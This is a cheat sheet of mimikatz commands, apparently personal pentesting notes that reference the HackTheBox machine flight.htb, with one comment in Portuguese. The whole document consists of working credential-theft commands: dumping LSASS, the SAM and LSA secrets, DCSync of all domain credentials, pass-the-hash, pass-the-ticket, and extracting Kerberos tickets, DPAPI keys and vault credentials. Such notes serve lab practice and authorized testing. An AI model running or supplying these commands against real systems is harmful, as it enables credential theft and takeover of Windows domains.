mimikatz
========================

    setspn -T flight.htb -Q */*

## Dump LSASS:

    mimikatz privilege::debug
    mimikatz token::elevate
    mimikatz sekurlsa::logonpasswords

## (Over) Pass The Hash

    mimikatz privilege::debug
    mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

## List all available kerberos tickets in memory

    mimikatz sekurlsa::tickets

## Dump local Terminal Services credentials

    mimikatz sekurlsa::tspkg

## Dump and save LSASS in a file

    mimikatz sekurlsa::minidump c:\temp\lsass.dmp

## List cached MasterKeys

    mimikatz sekurlsa::dpapi

## List local Kerberos AES Keys

    mimikatz sekurlsa::ekeys

## Dump SAM Database

    mimikatz lsadump::sam

## Dump SECRETS Database

    mimikatz lsadump::secrets

## Inject and dump the Domain Controller’s Credentials

    mimikatz privilege::debug
    mimikatz token::elevate
    mimikatz lsadump::lsa /inject
    lsadump::lsa /patch # ==> Esse foi o que funcionou bem pra mim.

## Dump the Domain’s Credentials without touching DC’s LSASS and also remotely

    mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

## List and Dump local kerberos credentials

    mimikatz kerberos::list /dump

## Pass The Ticket

    mimikatz kerberos::ptt <PathToKirbiFile>

## List TS/RDP sessions

    mimikatz ts::sessions

## List Vault credentials

    mimikatz vault::list

## Remove tickets from memory

	mimikatz kerberos::purge
